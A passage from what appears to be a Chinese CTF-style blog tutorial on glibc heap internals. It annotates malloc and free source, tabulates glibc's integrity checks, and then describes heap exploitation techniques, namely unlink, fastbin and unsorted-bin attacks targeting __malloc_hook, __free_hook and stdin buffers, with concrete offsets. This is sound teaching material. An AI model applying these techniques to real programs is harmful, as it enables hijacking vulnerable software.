是不是为空，如果非空，就分配该 <code>fastbin</code> 的第一个 <code>chunk</code> 给用户。</p><p>分配过程还会检查待分配的 <code>chunk</code> 的 <code>size</code> 是不是满足在该 <code>fastbin</code> 项的限制。</p><pre><code>fastbin_index (chunksize (victim)) != idx</code></pre><h3 id="搜索Smallbin"><a href="#搜索Smallbin" class="headerlink" title="搜索Smallbin"></a>搜索Smallbin</h3><p>如果 <code>fastbin</code> 为空或者 <code>nb</code> 不在 <code>fastbin</code> 里面，就会进入 <code>smallbin</code> 和 <code>largebin</code> 的处理逻辑</p><pre><code>if (in_smallbin_range (nb))    {      idx = smallbin_index (nb);//  找到 smallbin 索引      bin = bin_at (av, idx);      if ((victim = last (bin)) != bin) // 判断 bin 中是不是有 chunk        {          if (victim == 0) /* initialization check */            malloc_consolidate (av);          else            {              bck = victim-&gt;bk;    if (__glibc_unlikely (bck-&gt;fd != victim)) // 链表检查                {                  errstr = "malloc(): smallbin double linked list corrupted";                  goto errout;                }              set_inuse_bit_at_offset (victim, nb); //设置下一个chunk的 in_use 位              bin-&gt;bk = bck;              bck-&gt;fd = bin;              if (av != &amp;main_arena)                victim-&gt;size |= NON_MAIN_ARENA;              check_malloced_chunk (av, victim, nb);              void *p = chunk2mem (victim);              alloc_perturb (p, bytes);              return p;            }        }    }  /*     大内存分配，进入 malloc_consolidate   */  else    {      idx = largebin_index (nb);      if (have_fastchunks (av))        malloc_consolidate (av);    }</code></pre><p>如果申请的 <code>nb</code> 位于 <code>smallbin</code> 的范围，就会 <code>fastbin</code> 一样去找对应的项，然后判断 <code>bin</code> 是不是为空，如果不空, 分配第一个 <code>chunk</code> 给用户，分配之前还会校验该 <code>chunk</code> 是不是正确的。如果为空，就会进入 <code>unsorted bin</code> 的处理了。</p><pre><code>__glibc_unlikely (bck-&gt;fd != victim)</code></pre><p>如果 <code>nb</code> 不满足 <code>smallbin</code> ，就会触发 <code>malloc_consolidate</code> . 然后进入 <code>unsorted bin</code></p><h3 id="搜索Unsorted-bin"><a href="#搜索Unsorted-bin" class="headerlink" title="搜索Unsorted bin"></a>搜索Unsorted bin</h3><pre><code>int iters = 0;      while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) // 遍历 unsorted bin        {          bck = victim-&gt;bk;          size = chunksize (victim);          if (in_smallbin_range (nb) &amp;&amp;              bck == unsorted_chunks (av) &amp;&amp;              victim == av-&gt;last_remainder &amp;&amp;              (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE))            {              /* split and reattach remainder */              remainder_size = size - nb;              remainder = chunk_at_offset (victim, nb);              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;              av-&gt;last_remainder = remainder;              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);              if (!in_smallbin_range (remainder_size))                {                  remainder-&gt;fd_nextsize = NULL;                  remainder-&gt;bk_nextsize = NULL;                }              set_head (victim, nb | PREV_INUSE |                        (av != &amp;main_arena ? NON_MAIN_ARENA : 0));              set_head (remainder, remainder_size | PREV_INUSE);              set_foot (remainder, remainder_size);              check_malloced_chunk (av, victim, nb);              void *p = chunk2mem (victim);              alloc_perturb (p, bytes);              return p;            }</code></pre><p>遍历 <code>unsorted bin</code> ， 如果此时的 <code>unsorted bin</code> 只有一项，且他就是 <code>av-&gt;last_remainder</code> ,同时大小满足</p><pre><code>(unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE)</code></pre><p>就对当前 <code>unsorted bin</code> 进行切割，然后返回切割后的 <code>unsorted bin</code> 。</p><p>否则就先把该 <code>unsorted bin</code> 从 <code>unsorted list</code> 中移除下来，这里用了一个 类似 <code>unlink</code> 的操作，不过没有检查 <code>chunk</code> 的指针</p><pre><code>/*先摘下该 unsorted bin  */          unsorted_chunks (av)-&gt;bk = bck;          bck-&gt;fd = unsorted_chunks (av);          // 如果申请的大小和该 unsorted bin的大小刚好相等，就直接返回          if (size == nb)            {              set_inuse_bit_at_offset (victim, size);              if (av != &amp;main_arena)                victim-&gt;size |= NON_MAIN_ARENA;              check_malloced_chunk (av, victim, nb);              void *p = chunk2mem (victim);              alloc_perturb (p, bytes);              return p;            }</code></pre><p>如果申请的大小和该 <code>unsorted bin</code> 的大小刚好相等，就直接返回， 否则就把它放到相应的 <code>bin</code> 里面去。</p><pre><code>if (in_smallbin_range (size))            {              victim_index = smallbin_index (size);              bck = bin_at (av, victim_index);              fwd = bck-&gt;fd;            }          else            {              victim_index = largebin_index (size);              bck = bin_at (av, victim_index);              fwd = bck-&gt;fd;              .......              .......</code></pre><p>如果 <code>size</code> 在 <code>smallbin</code> 里就放到 <code>smallbin</code> ，否则就放到 <code>large bin</code></p><h3 id="搜索-Largebin"><a href="#搜索-Largebin" class="headerlink" title="搜索 Largebin"></a>搜索 Largebin</h3><p>接下来就会去搜索 <code>largebin</code> 了</p><pre><code>if (!in_smallbin_range (nb))        {          bin = bin_at (av, idx);          /* skip scan if empty or largest chunk is too small */          if ((victim = first (bin)) != bin &amp;&amp;              (unsigned long) (victim-&gt;size) &gt;= (unsigned long) (nb))            {              victim = victim-&gt;bk_nextsize;              while (((unsigned long) (size = chunksize (victim)) &lt;                      (unsigned long) (nb)))                victim = victim-&gt;bk_nextsize;              /* Avoid removing the first entry for a size so that the skip                 list does not have to be rerouted.  */              if (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)                victim = victim-&gt;fd;              remainder_size = size - nb;              unlink (av, victim, bck, fwd);              /* Exhaust */              if (remainder_size &lt; MINSIZE)                {                  set_inuse_bit_at_offset (victim, size);                  if (av != &amp;main_arena)                    victim-&gt;size |= NON_MAIN_ARENA;                }              /* Split */              else                {                  remainder = chunk_at_offset (victim, nb);                  /* We cannot assume the unsorted list is empty and therefore                     have to perform a complete insert here.  */                  bck = unsorted_chunks (av);                  fwd = bck-&gt;fd;      if (__glibc_unlikely (fwd-&gt;bk != bck))                    {                      errstr = "malloc(): corrupted unsorted chunks";                      goto errout;                    }                  remainder-&gt;bk = bck;                  remainder-&gt;fd = fwd;                  bck-&gt;fd = remainder;                  fwd-&gt;bk = remainder;                  if (!in_smallbin_range (remainder_size))                    {                      remainder-&gt;fd_nextsize = NULL;                      remainder-&gt;bk_nextsize = NULL;                    }                  set_head (victim, nb | PREV_INUSE |                            (av != &amp;main_arena ? NON_MAIN_ARENA : 0));                  set_head (remainder, remainder_size | PREV_INUSE);                  set_foot (remainder, remainder_size);                }              check_malloced_chunk (av, victim, nb);              void *p = chunk2mem (victim);              alloc_perturb (p, bytes);              return p;            }        }</code></pre><h3 id="使用-Top-chunk"><a href="#使用-Top-chunk" class="headerlink" title="使用 Top chunk"></a>使用 Top chunk</h3><pre><code>victim = av-&gt;top;      size = chunksize (victim);      // 如果 top chunk 大小足够大就从 top chunk 里面分配      if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE))        {          remainder_size = size - nb;          remainder = chunk_at_offset (victim, nb);          av-&gt;top = remainder;          set_head (victim, nb | PREV_INUSE |                    (av != &amp;main_arena ? NON_MAIN_ARENA : 0));          set_head (remainder, remainder_size | PREV_INUSE);          check_malloced_chunk (av, victim, nb);          void *p = chunk2mem (victim);          alloc_perturb (p, bytes);          return p;        }      /* When we are using atomic ops to free fast chunks we can get         here for all block sizes.  */      else if (have_fastchunks (av))        {          malloc_consolidate (av);          /* restore original bin index */          if (in_smallbin_range (nb))            idx = smallbin_index (nb);          else            idx = largebin_index (nb);        }      /*         Otherwise, relay to handle system-dependent cases       */      else        {          void *p = sysmalloc (nb, av);          if (p != NULL)            alloc_perturb (p, bytes);          return p;        }    }</code></pre><p>如果 <code>top chunk</code> 的大小足够就直接切割分配，否则如果此时还有 <code>fastbin</code> 就触发 <code>malloc_consolidate</code> 重复上述流程，如果没有 <code>fastbin</code> 调用 <code>sysmalloc</code> 分配内存</p><h2 id="Free-源码分析"><a href="#Free-源码分析" class="headerlink" title="Free 源码分析"></a>Free 源码分析</h2><h3 id="GI-libc-free"><a href="#GI-libc-free" class="headerlink" title="_GI___libc_free"></a>_GI___libc_free</h3><p>首先是 <code>_GI___libc_free</code></p><pre><code>void __fastcall _GI___libc_free(void *ptr){  if ( _free_hook )  {    _free_hook(ptr, retaddr);  }  else if ( ptr )  {    v1 = (unsigned __int64)ptr - 16;    v2 = *((_QWORD *)ptr - 1);    if ( v2 &amp; 2 )                               // 判断size位，判断是不是 mmap 获得的 chunk    {      if ( !mp_.no_dyn_threshold        &amp;&amp; v2 &gt; mp_.mmap_threshold        &amp;&amp; v2 &lt;= 0x2000000        &amp;&amp; (v1 &lt; (unsigned __int64)dumped_main_arena_start || v1 &gt;= (unsigned __int64)dumped_main_arena_end) )      {        mp_.mmap_threshold = v2 &amp; 0xFFFFFFFFFFFFFFF8LL;        mp_.trim_threshold = 2 * (v2 &amp; 0xFFFFFFFFFFFFFFF8LL);      }      munmap_chunk((mchunkptr)((char *)ptr - 16));    }    else    {      av = &amp;main_arena;      if ( v2 &amp; 4 )        av = *(malloc_state **)(v1 &amp; 0xFFFFFFFFFC000000LL);      int_free(av, (mchunkptr)v1, 0);    }  }}</code></pre><p>如果存在 <code>free_hook</code> ， 就会直接调用 <code>free_hook(ptr)</code> 然后返回。否则判断被 <code>free</code> 的 内存是否是 <code>mmap</code> 获取的 ，如果是则使用 <code>munmap_chunk</code> 回收内存，否则进入 <code>_int_free</code></p><h3 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a>_int_free</h3><p>首先会做一些简单的检查</p><pre><code>size = chunksize (p);  //检查指针是否正常，对齐  if (__builtin_expect ((uintptr_t) p &gt; (uintptr_t) -size, 0)      || __builtin_expect (misaligned_chunk (p), 0))    {      errstr = "free(): invalid pointer";    errout:      if (!have_lock &amp;&amp; locked)        (void) mutex_unlock (&amp;av-&gt;mutex);      malloc_printerr (check_action, errstr, chunk2mem (p), av);      return;    }// 检查 size 是否 &gt;= MINSIZE ，且是否对齐  if (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))    {      errstr = "free(): invalid size";      goto errout;    }// 检查 chunk 是否处于 inuse 状态  check_inuse_chunk(av, p);</code></pre><p>检查</p><ul><li>指针是否对齐</li><li>块的大小是否对齐，且大于最小的大小</li><li>块是否在 <code>inuse</code> 状态</li></ul><h3 id="进入-fastbin"><a href="#进入-fastbin" class="headerlink" title="进入 fastbin"></a>进入 fastbin</h3><pre><code>if ((unsigned long)(size) &lt;= (unsigned long)(get_max_fast ())) {    if (have_lock        || ({ assert (locked == 0);          mutex_lock(&amp;av-&gt;mutex);          locked = 1;          chunk_at_offset (p, size)-&gt;size &lt;= 2 * SIZE_SZ // next-&gt;size &lt;= 2 * SIZE_SZ            || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem; //           }))      {        errstr = "free(): invalid next size (fast)";        goto errout;      }    set_fastchunks(av);    unsigned int idx = fastbin_index(size);    fb = &amp;fastbin (av, idx);    mchunkptr old = *fb, old2;    unsigned int old_idx = ~0u;    do      {    if (__builtin_expect (old == p, 0))      {        errstr = "double free or corruption (fasttop)";        goto errout;      }    if (have_lock &amp;&amp; old != NULL)      old_idx = fastbin_index(chunksize(old));    p-&gt;fd = old2 = old; // 插入 fastbin      }    while ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);    if (have_lock &amp;&amp; old != NULL &amp;&amp; __builtin_expect (old_idx != idx, 0))      {    errstr = "invalid fastbin entry (free)";    goto errout;      }  }</code></pre><p>如果 <code>size</code> 满足 <code>fastbin</code> 的条件，则首先判断 <code>next_chunk-&gt;size</code> 要满足</p><pre><code>next_chunk-&gt;size &gt; 2 * SIZE_SZnext_chunk-&gt;size &lt; av-&gt;system_mem</code></pre><p>接着就会找对相应的 <code>fastbin</code> ，然后插入 该 <code>bin</code> 的第一项。插入前有一个检查</p><pre><code>if (__builtin_expect (old == p, 0))      {        errstr = "double free or corruption (fasttop)";        goto errout;      }</code></pre><p>就是 <code>p-&gt;size</code> 索引到的 <code>fastbin</code> 的第一个指针不能和当前的 <code>p</code> 相同，否则会被认为是 <code>double free</code></p><h3 id="进入-Unsorted-bin"><a href="#进入-Unsorted-bin" class="headerlink" title="进入 Unsorted bin"></a>进入 Unsorted bin</h3><p>如果被 <code>free</code> 的这个块不是 通过 <code>mmap</code> 获得的，就会进入下面的逻辑</p><pre><code>else if (!chunk_is_mmapped(p)) {    if (! have_lock) {      (void)mutex_lock(&amp;av-&gt;mutex);      locked = 1;    }    // 得到下一个 chunk 的指针    nextchunk = chunk_at_offset(p, size);    // 不能 free top chunk    if (__glibc_unlikely (p == av-&gt;top))      {        errstr = "double free or corruption (top)";        goto errout;      }   // nextchunk 不能越界，就是限制了 p-&gt;size    if (__builtin_expect (contiguous (av)              &amp;&amp; (char *) nextchunk              &gt;= ((char *) av-&gt;top + chunksize(av-&gt;top)), 0))      {    errstr = "double free or corruption (out)";    goto errout;      }    /*p 要被标识为 inuse 状态 */    if (__glibc_unlikely (!prev_inuse(nextchunk)))      {        errstr = "double free or corruption (!prev)";        goto errout;      }    nextsize = chunksize(nextchunk);    // nextsize 在  [ 2 * SIZE_SZ, av-&gt;system_mem] 之间    if (__builtin_expect (nextchunk-&gt;size &lt;= 2 * SIZE_SZ, 0)    || __builtin_expect (nextsize &gt;= av-&gt;system_mem, 0))      {        errstr = "free(): invalid next size (normal)";        goto errout;      }    free_perturb (chunk2mem(p), size - 2 * SIZE_SZ);    /* 如果 p的前一个块是 free 状态，就向前合并，通过 p-&gt;pre_inused 判断*/    if (!prev_inuse(p)) {      prevsize = p-&gt;prev_size;      size += prevsize;      p = chunk_at_offset(p, -((long) prevsize));      unlink(av, p, bck, fwd);    }    if (nextchunk != av-&gt;top) {      // 获得 nextchunk 的下一个 chunk, 的 pre_inused位      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);      // 如果 nextchunk 也是 free 状态的，合并      if (!nextinuse) {        unlink(av, nextchunk, bck, fwd);        size += nextsize;      } else    clear_inuse_bit_at_offset(nextchunk, 0);      // 合并的结果放置到 unsorted bin      bck = unsorted_chunks(av);      fwd = bck-&gt;fd;      // 防止 unsortedbin 被破坏      if (__glibc_unlikely (fwd-&gt;bk != bck))    {      errstr = "free(): corrupted unsorted chunks";      goto errout;    }      p-&gt;fd = fwd;      p-&gt;bk = bck;      if (!in_smallbin_range(size))    {      p-&gt;fd_nextsize = NULL;      p-&gt;bk_nextsize = NULL;    }      bck-&gt;fd = p;      fwd-&gt;bk = p;      set_head(p, size | PREV_INUSE);      set_foot(p, size);      check_free_chunk(av, p);    }    else {      size += nextsize;      set_head(p, size | PREV_INUSE);      av-&gt;top = p;      check_chunk(av, p);    }    // 如果 free 得到的 unsorted bin 的 size(包括合并chunk 得到的) 大于等于 FASTBIN_CONSOLIDATION_THRESHOLD 就会触发 malloc_consolidate    if ((unsigned long)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) {      if (have_fastchunks(av))    malloc_consolidate(av);      if (av == &amp;main_arena) {#ifndef MORECORE_CANNOT_TRIM    if ((unsigned long)(chunksize(av-&gt;top)) &gt;=        (unsigned long)(mp_.trim_threshold))      systrim(mp_.top_pad, av);#endif      } else {    /* Always try heap_trim(), even if the top chunk is not       large, because the corresponding heap might go away.  */    heap_info *heap = heap_for_ptr(top(av));    assert(heap-&gt;ar_ptr == av);    heap_trim(heap, mp_.top_pad);      }    }    if (! have_lock) {      assert (locked);      (void)mutex_unlock(&amp;av-&gt;mutex);    }  }  /*    If the chunk was allocated via mmap, release via munmap().  */</code></pre><p>大概流程</p><ul><li>首先做了一些检查， <code>p != top_chunk</code>, <code>p-&gt;size</code> 不能越界， 限制了 <code>next_chunk-&gt;size</code>, <code>p</code>要处于 <code>inuse</code>状态（通过 <code>next_chunk-&gt;pre_inused</code> 判断）</li><li>接着判断 <code>p</code> 的前后相邻块是不是 <code>free</code> 状态，如果是就合并</li><li>根据此次拿到的 <code>unsorted bin</code> 的 大小，如果 <code>size&gt;=FASTBIN_CONSOLIDATION_THRESHOLD</code> 就会触发 <code>malloc_consolidate</code></li></ul><p>如果 <code>p</code> 是通过 <code>mmap</code> 获得的，就通过</p><pre><code>munmap_chunk (p);</code></pre><p>释放掉他</p><h2 id="Check-In-Glbc"><a href="#Check-In-Glbc" class="headerlink" title="Check In Glbc"></a>Check In Glbc</h2><table><thead><tr><th>函数名</th><th>检查</th><th>报错信息</th></tr></thead><tbody><tr><td>unlink</td><td>p-&gt;size == nextchunk-&gt;pre_size</td><td>corrupted size vs prev_size</td></tr><tr><td>unlink</td><td>p-&gt;fd-&gt;bk == p 且 p-&gt;bk-&gt;fd == p</td><td>corrupted double-linked list</td></tr><tr><td>_int_malloc</td><td>当从fastbin分配内存时 ,找到的那个fastbin chunk的size要等于其位于的fastbin 的大小，比如在0x20的 fastbin中其大小就要为0x20</td><td>malloc():memory corruption (fast)</td></tr><tr><td>_int_malloc</td><td>当从 smallbin 分配 chunk( victim) 时， 要求 victim-&gt;bk-&gt;fd == victim</td><td>malloc(): smallbin double linked list corrupted</td></tr><tr><td>_int_malloc</td><td>当迭代 unsorted bin 时 ，迭代中的 chunk (cur)要满足，cur-&gt;size 在 [2*SIZE_SZ, av-&gt;system_mem] 中</td><td>malloc(): memory corruption</td></tr><tr><td>_int_free</td><td>当插入一个 chunk 到 fastbin时，判断fastbin的 head 是不是和 释放的 chunk 相等</td><td>double free or corruption (fasttop)</td></tr><tr><td>_int_free</td><td>判断 next_chunk-&gt;pre_inuse == 1</td><td>double free or corruption (!prev</td></tr></tbody></table><p><strong>来源</strong><br><a href="https://github.com/DhavalKapil/heap-exploitation" target="_blank" rel="noopener">heap-exploitation</a></p><h1 id="各种漏洞原理及利用"><a href="#各种漏洞原理及利用" class="headerlink" title="各种漏洞原理及利用"></a>各种漏洞原理及利用</h1><h2 id="通用的信息泄露思路"><a href="#通用的信息泄露思路" class="headerlink" title="通用的信息泄露思路"></a>通用的信息泄露思路</h2><p>当 <code>chunk</code> 处于 <code>free</code> 状态时，会进入 <code>bin</code> 里面，其中的 <code>fd</code> 和 <code>bk</code> 可以用于信息泄露</p><ul><li>分配两个 <code>0x90</code> 的 <code>chunk(p0, p1)</code></li><li>释放掉 <code>p0</code>, <code>p0</code> 会进入 <code>unsorted bin</code></li><li>分配 <code>0x90</code> 的 <code>chunk</code>,再次拿到 <code>p0</code>, 在 <code>malloc</code> 的实现中不会对这些指针进行清空，就可以泄露</li></ul><p>如果分配后的内存被 <code>memset</code> 清空后，就需要利用一些其他的漏洞才能利用。</p><blockquote><pre><code>Unsorted bin` 用于泄露 `libc</code></pre><p><code>fastbin</code> 用于 泄露 <code>heap</code> 地址</p></blockquote><h2 id="Unlink-利用"><a href="#Unlink-利用" class="headerlink" title="Unlink 利用"></a>Unlink 利用</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在把 <code>chunk</code> 从 <code>bins</code> 拿下来时 会触发 <code>unlink</code> 操作</p><pre><code>/* Take a chunk off a bin list */#define unlink(AV, P, BK, FD) {                                            \    FD = P-&gt;fd;                                   \    BK = P-&gt;bk;                                   \    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))             \      malloc_printerr (check_action, "corrupted double-linked list", P, AV);  \    else {                                    \        FD-&gt;bk = BK;                                  \        BK-&gt;fd = FD;                                  \        if (!in_smallbin_range (P-&gt;size)                      \            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) {            \        if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)        \        || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \          malloc_printerr (check_action,                      \                   "corrupted double-linked list (not small)",    \                   P, AV);                        \            if (FD-&gt;fd_nextsize == NULL) {                    \                if (P-&gt;fd_nextsize == P)                      \                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;             \                else {                                \                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                 \                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                 \                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                 \                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                 \                  }                               \              } else {                                \                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;             \                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;             \              }                                   \          }                                   \      }                                       \}</code></pre><p>如果我们可以伪装 <code>fd</code> 和 <code>bk</code> 过掉 <code>unlink</code> 的检查，就可以实现 <code>4</code> 字节写</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>首先利用其它的漏洞伪造下面的内存布局</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/20201216172350.png" alt=""></p><ul><li>p0 = malloc(0x80), p1 = malloc(0x80), ptr = p0</li><li>此时 <code>free(p1)</code> ，发现 <code>p1</code> 所在 <code>chunk</code> 的 <code>pre_size = 0</code> , 表明前一个 <code>chunk</code> 已经 <code>free</code>, 于是向前合并</li><li>通过 <code>p1 - 0x10 - 0x80</code> ( <strong>chunk_addr - pre_size</strong> ) , 找到前面已经释放的 <code>chunk</code> , 也就是 我们 伪造的 <code>fake chunk p1</code></li><li>然后进行 <code>unlink</code>, 实现 <code>*ptr = ptr-0x18</code></li></ul><h2 id="Fastbin-Attack-总结"><a href="#Fastbin-Attack-总结" class="headerlink" title="Fastbin Attack 总结"></a>Fastbin Attack 总结</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p><code>Fastbin</code> 在分配 <code>chunk</code> 时，只检查 <strong>p-&gt;size&amp;0xfffffffffffff000是否满足等于的 fastbin的大小</strong> ，而且<strong>不检查指针是否对齐</strong>。所以我们只要找到 <code>size</code> 为 <code>fastbin</code> 的范围，然后修改 位于 <code>fastbin</code> 的 <code>chunk</code> 的 <code>fd</code> 到这 ，分配几次以后，就可以分配到这个位置</p><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><h4 id="利用-libc-中的-现有的-数据"><a href="#利用-libc-中的-现有的-数据" class="headerlink" title="利用 libc 中的 现有的 数据"></a>利用 libc 中的 现有的 数据</h4><h5 id="malloc-hook-附近"><a href="#malloc-hook-附近" class="headerlink" title="__malloc_hook 附近"></a>__malloc_hook 附近</h5><p>64位下在 <strong>__malloc_hook - 0x23 + 0x8</strong> 处 的值 为 <code>p64(0x7f)</code> ，这些值可以通过 <code>gdb + hexdump</code> 找找</p><p>然后想办法修改 位于 <code>0x70</code> 的 <code>fastbin</code> 的 <code>chunk</code> 的 <code>fd</code> 为 <strong>__malloc_hook - 0x23</strong>，然后分配几次 0x70 的 chunk 就可以修改 <code>__malloc_hook</code></p><h5 id="main-arean-gt-fastbinY-数组"><a href="#main-arean-gt-fastbinY-数组" class="headerlink" title="main_arean->fastbinY 数组"></a>main_arean-&gt;fastbinY 数组</h5><p>该数组用于存放 指定大小的 <code>fastbin</code> 的表头指针，如果为空则为 <code>p64(0)</code> , 而堆的地址基本 是 <code>0x5x</code> 开头的（其在内存就是 <code>xx xx..... 5x</code>)， 此时如果在 <code>main_arean-&gt;fastbinY</code> 的 相邻项为 <code>0x0</code> (相邻大小的 <code>fastbin</code>), 就会出现 <code>5x 00 00 00...</code> , 所以就可以出现 <code>0x000000000000005x</code> ，可以把它作为 <code>fastbin</code> 的 <code>size</code> 进行 <code>fastbin attack</code> ，<strong>不过作为 fastbin attack 的 size 不能 为 0x55</strong></p><p>于是想办法修改 位于 <code>0x50</code> 的 <code>fastbin</code> 的 <code>chunk</code> 的 <code>fd</code> 为 <strong>__malloc_hook - 0x23</strong>，然后分配几次 <code>0x50</code> 的 chunk 就可以分配到 <code>main_arean</code>, 然后就可以修改 <code>main_arean-&gt;top</code> 。</p><h5 id="std-结构体"><a href="#std-结构体" class="headerlink" title="std* 结构体"></a>std* 结构体</h5><p>在 <code>std*</code> 类结构体中有很多字段都会被设置为 0x0 , 同时其中的某些字段会有 libc 的地址大多数情况下 libc 是加载在 <code>0x7f....</code> ， 配合着 <code>std*</code> 中的 其他 0x0 的字段，我们就可以有 <code>p64(0x7f)</code> ， 然后修改 位于 <code>0x70</code>的 <code>fastbin</code> 的 <code>chunk</code> 的 <code>fd</code> 为该位置即可。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/20201216172420.png" alt=""></p><h4 id="自己构造-size"><a href="#自己构造-size" class="headerlink" title="自己构造 size"></a>自己构造 size</h4><h5 id="利用-unsorted-bin-attack-往-free-hook-构造-size"><a href="#利用-unsorted-bin-attack-往-free-hook-构造-size" class="headerlink" title="利用 unsorted bin attack 往 __free_hook 构造 size"></a>利用 unsorted bin attack 往 __free_hook 构造 size</h5><p>我们知道如果我们可以 修改 <code>unsorted bin</code> 的 <code>fd</code> 和 <code>bk</code> , 在对 <code>unsorted bin</code> 拆卸的 时候 我们就能实现</p><pre><code>*(bk + 0x10) = main_arean-&gt;unsorted_bin</code></pre><p>利用这个我们就能往任意地址写入 <code>main_arean</code> 的地址， 由于 <code>libc</code> 的地址基本都是 <code>0x7fxxxxx</code>, 所以写完以后我们就可以在 <code>__free_hook</code> 的前面构造出 <code>p64(0x7f)</code> , 可以作为 <code>fastbin attack</code> 的目标，然后修改 <code>__free_hook</code></p><p>有一个<strong>小坑</strong>要注意，在 <code>__free_hook-0x30</code> 开始 的 <code>0x30</code> 个字节 是 <code>_IO_stdfile_*_lock</code> 区域，用于 <code>std*</code>类文件的锁操作，这个区域的内存会被<strong>经常清零</strong>。</p><p>所以 <code>unsorted bin attack</code> 应该往上面一点， 比如 <strong>libc.symbols[‘__free_hook’] - 0x50</strong></p><p>还有一点就是在进行 <code>unsorted bin attack</code> 以后 ， <code>unsorted bin</code> 链表就被破坏了，所以 就只能通过 <code>fastbin</code> 或者 <code>smallbin</code> 进行内存的分配，所以我们应该先劫持 <code>fastbin</code> 的 <code>fd</code> 到 目标位置，然后触发 <code>unsorted bin attack</code> 写入 <code>size</code>, 最后进行 <code>fastbin attack</code> ，修改 <code>__free_hook</code></p><h5 id="利用-fastbin-往-main-arean-构造-size"><a href="#利用-fastbin-往-main-arean-构造-size" class="headerlink" title="利用 fastbin 往 main_arean 构造 size"></a>利用 fastbin 往 main_arean 构造 size</h5><ul><li><p>首先分配 <code>0x40</code> 的 <code>chunk p</code>, 然后释放掉 <code>p</code> ，进入 <code>0x40</code> 的 <code>fastbin</code></p></li><li><p>然后通过一些手段，修改 <code>p-&gt;fd = p64(0x71)</code></p></li><li><p>分配 <code>0x40</code> 的 <code>chunk</code> ，会拿到 <code>p</code> , 此时 <code>main_arean-&gt;fastbinY</code> 中 <code>0x40</code> 大小对应的项的值为 <code>p64(0x71)</code></p></li><li><p>然后分配 <code>0x71</code> 的 <code>chunk p2</code>, 释放掉</p></li><li><p>修改 <code>p2-&gt;fd</code> 为 <code>main_arean-&gt;fastbinY</code> 的相应位置，然后分配两次，即可分配到 <code>main_arean-&gt;fastbinY</code></p></li><li><p>然后通过修改 <code>main_arean-&gt;top</code>, 即可分配到 <strong>malloc_hook 或者 free_hook</strong> 等</p></li></ul><h2 id="Unsorted-bin-Attack"><a href="#Unsorted-bin-Attack" class="headerlink" title="Unsorted bin Attack"></a>Unsorted bin Attack</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>因为 <code>unsorted bin</code> 的取出操作没有使用 <code>unlink</code> 宏，而是自己实现的几行代码</p><pre><code>bck = victim-&gt;bk;...unsorted_chunks (av)-&gt;bk = bck;bck-&gt;fd = unsorted_chunks (av);</code></pre><p>所以当我们控制了 victim的 bk 时，则 <code>bk + 0x10</code> 会被改写成 <strong>unsorted bin 的地址</strong>，但是 <code>unsorted bin</code> 的 <code>bk</code> <strong>也会被破坏</strong>，下一次再到这里时就可能因为 <code>victim-&gt;bk-&gt;fd</code> 不可写而造成 <code>SIGSEGV</code>。</p><p>所以在触发 <code>unsorted bin attack</code> 以后就 <strong>只能</strong> 通过 <strong>fastbin</strong> 和 <strong>smallbin</strong> 来分配内存了(<strong>否则会进入 unsorted bin 的流程，会报错</strong>)，所以在 触发 <code>unsorted bin attack</code> 需要把需要的内存布局好。</p><h3 id="利用的方式"><a href="#利用的方式" class="headerlink" title="利用的方式"></a>利用的方式</h3><h5 id="写-stdin-gt-IO-buf-end"><a href="#写-stdin-gt-IO-buf-end" class="headerlink" title="写 stdin->_IO_buf_end"></a>写 stdin-&gt;_IO_buf_end</h5><p>在 glibc中 scanf, gets 等函数默认是对 stdin 结构体进行操作。以 <code>scanf</code> 为例</p><ul><li>在调用 <code>scanf</code> 获取输入时，首先会把输入的东西复制到 <code>[_IO_buf_base , _IO_buf_end ]</code>, 最大大小为 <code>_IO_buf_end - _IO_buf_base</code>。</li><li>修改 <code>unsorted bin</code> 的 <code>bck</code> 为 <code>_IO_base_end-0x10</code> ,就可以使 <code>_IO_base_end=main_arens+0x88</code>,我们就能修改很多东西了，<strong>而且 malloc_hook 就在这里面</strong>。</li></ul><h5 id="IO-list-all-和-abort-以及-修改虚表到-IO-wstrn-jumps"><a href="#IO-list-all-和-abort-以及-修改虚表到-IO-wstrn-jumps" class="headerlink" title="__IO_list_all 和 abort 以及 修改虚表到 _IO_wstrn_jumps"></a>__IO_list_all 和 abort 以及 修改虚表到 _IO_wstrn_jumps</h5><h6 id="原理-3"><a href="#原理-3" class="headerlink" 